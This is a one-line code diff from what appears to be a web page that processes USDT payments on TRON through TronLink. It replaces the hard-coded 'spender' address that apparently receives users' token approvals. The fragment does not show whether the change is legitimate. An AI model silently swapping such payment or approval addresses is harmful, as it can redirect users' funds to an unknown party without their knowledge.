@@ -116,7 +116,7 @@ export default function Index() {
     setTransactionStatusState("processing");
     try {
       const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-      const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
+      const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
       // TronLink path
       if (window.tronWeb?.defaultAddress?.base58) {
